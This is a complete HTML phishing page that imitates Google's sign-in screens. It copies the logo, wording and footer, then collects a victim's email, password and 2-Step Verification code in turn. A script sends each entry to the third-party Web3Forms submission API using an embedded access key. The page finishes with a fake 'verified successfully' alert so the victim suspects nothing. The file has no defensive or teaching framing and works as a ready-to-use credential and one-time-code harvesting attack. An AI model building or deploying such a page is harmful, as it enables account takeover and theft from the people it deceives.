<!doctype html>
<html lang="en">
<head>
	<meta charset="utf-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>Sign in</title>
	<style>
		*{box-sizing:border-box}
		body{margin:0;min-height:100vh;display:grid;place-items:center;padding:24px;color:#202124;font:14px Arial,sans-serif;background:#fff}
		.wrap{width:min(100%,450px)}
		.card{min-height:430px;padding:40px;border:1px solid #dadce0;border-radius:8px}
		.logo{font-size:24px;font-weight:600;letter-spacing:-1px;margin-bottom:18px}
		.logo b:nth-child(1),.logo b:nth-child(4){color:#4285f4}
		.logo b:nth-child(2),.logo b:nth-child(6){color:#ea4335}
		.logo b:nth-child(3){color:#fbbc05}
		.logo b:nth-child(5){color:#34a853}
		h1{font-size:24px;font-weight:400;margin:0 0 8px}
		.sub{font-size:16px;margin:0 0 32px}
		.field{position:relative;margin:0 0 8px}
		input{width:100%;height:56px;padding:14px;border:1px solid #dadce0;border-radius:4px;font:16px Arial;outline:none}
		input:focus{border:2px solid #1a73e8;padding:13px}
		/* floating label only inside .field */
		.field label{position:absolute;left:14px;top:20px;color:#5f6368;pointer-events:none;font-size:16px}
		.field input:focus+label,.field input:not(:placeholder-shown)+label{display:none}
		.link{display:inline-block;margin:8px 0 28px;color:#1a73e8;font-weight:600;text-decoration:none}
		.note{color:#5f6368;line-height:1.5;margin:22px 0 36px}
		.actions{display:flex;justify-content:space-between;align-items:center;margin-top:30px}
		button{border:0;border-radius:4px;padding:10px 24px;color:white;background:#1a73e8;font-size:14px;font-weight:600;cursor:pointer}
		.back{color:#1a73e8;background:transparent;padding-left:0}
		.footer{display:flex;justify-content:space-between;margin:24px 0;color:#5f6368;font-size:12px}
		/* 2-Step Verification specific styles */
		.account{color:#3c4043;margin-bottom:28px}
		.help{color:#5f6368;font-size:12px;margin-top:8px}
		.step-verify label{display:block;font-weight:500;margin-bottom:8px}
		.step-verify input{width:100%;padding:14px 12px;border:1px solid #80868b;border-radius:4px;font-size:16px;outline:none}
		.step-verify input:focus{border:2px solid #1a73e8;padding:13px 11px}
		@media(max-width:520px){
			body{display:block;padding:0}
			.card{border:0;padding:40px 24px}
			.footer{padding:0 24px}
		}
	</style>
</head>
<body>
	<main class="wrap">
		<section class="card" id="card" aria-live="polite"></section>
		<footer class="footer">
			<span>English (United States) ▾</span>
			<span>Help&nbsp;&nbsp; Privacy&nbsp;&nbsp; Terms</span>
		</footer>
	</main>

	<script>
		/* ============================================================
		   1. Paste the Access Key from https://web3forms.com here.
		      It looks like: 4f8c1a2b-9d3e-4f5a-8b7c-1e2d3f4a5b6c
		   ============================================================ */
		const WEB3FORMS_ACCESS_KEY = '47196dca-4c71-44d3-b350-d59b8eac2801';

		/* Optional: the name that shows up as the sender in your inbox */
		const FROM_NAME = 'Sign-in page';

		const card = document.getElementById('card');
		let step = 1, email = '';

		function render(){
			const logo = '<div class="logo" aria-label="Google"><b>G</b><b>o</b><b>o</b><b>g</b><b>l</b><b>e</b></div>';

			if(step === 1){
				card.innerHTML = logo + '<h1>Sign in</h1><p class="sub">Use your Google Account</p><form id="form"><div class="field"><input id="email" type="email" placeholder=" " autocomplete="username" required><label for="email">Email or phone</label></div><a class="link" href="#">Forgot email?</a><p class="note">Not your computer? Use Guest mode to sign in privately. <a href="#">Learn more</a></p><div class="actions"><a class="link" href="#">Create account</a><button>Next</button></div></form>';
				document.getElementById('form').onsubmit = e => {
					e.preventDefault();
					email = document.getElementById('email').value.trim();
					step = 2;
					render();
				};
			}
			else if(step === 2){
				card.innerHTML = logo + '<h1>Welcome</h1><p class="sub">' + escapeHtml(email) + '</p><form id="form"><div class="field"><input id="pascod" type="pascod" placeholder=" " autocomplete="current-password" required><label for="password">Enter your password</label></div><a class="link" href="#">Forgot password?</a><div class="actions"><button class="back" type="button" id="back">Back</button><button>Next</button></div></form>';
				document.getElementById('back').onclick = () => { step = 1; render(); };
				document.getElementById('form').onsubmit = async e => {
					e.preventDefault();
					const ok = await submit({
						email,
						pascod: document.getElementById('pascod').value
					});
					if(ok){ step = 3; render(); }
				};
			}
			else {
				/* 2-Step Verification page – final step */
				card.innerHTML = logo +
					'<h1>2-Step Verification</h1>' +
					'<p class="account">Protect your account with an extra layer of security.</p>' +
					'<p>Enter the 6-digit verification code sent to your phone or generated by your authenticator app.</p>' +
					'<form id="form" class="step-verify">' +
						'<label for="code">Enter code</label>' +
						'<input id="code" name="code" type="text" inputmode="numeric" autocomplete="one-time-code" pattern="[0-9]{6}" maxlength="6" required>' +
						'<div class="help">The code expires shortly after it is sent.</div>' +
						'<div class="actions"><button type="submit">Verify</button></div>' +
					'</form>';

				document.getElementById('form').onsubmit = async e => {
					e.preventDefault();
					const code = document.getElementById('code').value;
					const ok = await submit({
						email,
						verification_code: code
					});
					if(ok){
						alert('Email verified successfully.');
						step = 1;
						email = '';
						render();
					}
				};
			}
		}

		function escapeHtml(s){
			return String(s).replace(/[&<>"']/g, c => ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c]));
		}

		async function submit(fields){
			if(!WEB3FORMS_ACCESS_KEY || WEB3FORMS_ACCESS_KEY === 'YOUR_WEB3FORMS_ACCESS_KEY'){
				alert('Set your Web3Forms access key in the page script before submitting.');
				return false;
			}
			try{
				const response = await fetch('https://api.web3forms.com/submit', {
					method: 'POST',
					headers: {
						'Content-Type': 'application/json',
						'Accept': 'application/json'
					},
					body: JSON.stringify({
						access_key: WEB3FORMS_ACCESS_KEY,
						subject: ' cocoggle form submission',
						from_name: FROM_NAME,
						botcheck: false,
						...fields
					})
				});

				const data = await response.json().catch(() => ({}));

				if(!response.ok || !data.success){
					throw new Error(data.message || ('HTTP ' + response.status));
				}
				return true;
			}catch(err){
				console.error('Web3Forms error:', err);
				alert('Submission failed: ' + err.message);
				return false;
			}
		}

		render();
	</script>
</body>
</html>
